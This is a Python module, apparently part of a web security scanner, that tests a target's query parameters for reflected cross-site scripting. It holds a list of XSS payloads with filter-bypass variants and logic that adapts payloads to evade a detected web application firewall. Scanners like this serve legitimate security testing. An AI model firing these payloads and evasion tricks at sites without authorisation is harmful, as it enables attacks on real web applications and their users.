from __future__ import annotations

import asyncio

from ..core.encoding import encode_payloads
from ..core.models import Finding, Severity
from ..core.waf_detect import detect_waf, waf_adapt_payload

# Reflected XSS payloads for different contexts
PAYLOADS = [
    # HTML body context
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    # Attribute context
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" onfocus="alert(1)" autofocus="',
    # JavaScript context
    "'-alert(1)-'",
    "';alert(1)//",
    "</script><script>alert(1)</script>",
    # URL context
    "javascript:alert(1)",
    # Filter bypass
    "<ScRiPt>alert(1)</sCrIpT>",
    "<img src=x onerror=alert&#40;1&#41;>",
    "<svg/onload=alert(1)>",
    # Event handlers
    "<input onfocus=alert(1) autofocus>",
    "<iframe src=\"javascript:alert(1)\">",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
]

BENIGN = "rmw-baseline-check-12345"

# Common parameters to test
PARAMS = [
    "q", "search", "name", "redirect", "next", "return", "page", "id",
    "query", "keyword", "term", "text", "message", "comment", "title",
]


async def _probe_param(ctx, base: str, param: str) -> None:
    # Baseline with benign value
    if not ctx.can_request():
        return
    ctx.increment()
    baseline_resp = await ctx.http.get(base, params={param: BENIGN}, timeout=ctx.settings.timeout)
    baseline_body = baseline_resp.text or ""

    encoding = getattr(ctx.settings, "payload_encoding", "none")
    payloads = encode_payloads(PAYLOADS, encoding)
    if getattr(ctx.settings, "waf_adapt", False) and getattr(ctx, "waf_type", None):
        adapted = []
        for p in payloads:
            adapted.extend(waf_adapt_payload(p, ctx.waf_type))
        seen = set()
        payloads = [p for p in adapted if not (p in seen or seen.add(p))]
    for payload in payloads:
        if not ctx.can_request():
            return
        ctx.increment()
        resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout)
        body = resp.text or ""
        # Only flag if payload is reflected AND not in baseline
        if payload in body and payload not in baseline_body:
            # Determine context
            context = "HTML body"
            if '"' in payload and 'onmouseover' in payload:
                context = "attribute"
            elif 'javascript:' in payload:
                context = "URL"
            elif 'alert(1)' in payload and "'" in payload and '-' in payload:
                context = "JavaScript"
            ctx.add_finding(Finding(
                id=f"reflected-xss-{param}",
                title=f"Potential reflected XSS via '{param}' parameter",
                severity=Severity.MEDIUM,
                confidence=0.75,
                asset=f"{base}?{param}={payload}",
                module="xss",
                description=f"Payload reflected unencoded in response ({context} context).",
                remediation="Apply context-aware output encoding and CSP.",
                tags=["xss", "reflected"],
            ))
            return  # One finding per param is enough


async def run(ctx) -> None:
    base = f"https://{ctx.target}"
    try:
        resp = await ctx.http.get(base, timeout=ctx.settings.timeout)
        ctx.waf_type = detect_waf(resp.headers, resp.text)
    except Exception:
        ctx.waf_type = None
    tasks = [_probe_param(ctx, base, param) for param in PARAMS]
    await asyncio.gather(*tasks, return_exceptions=True)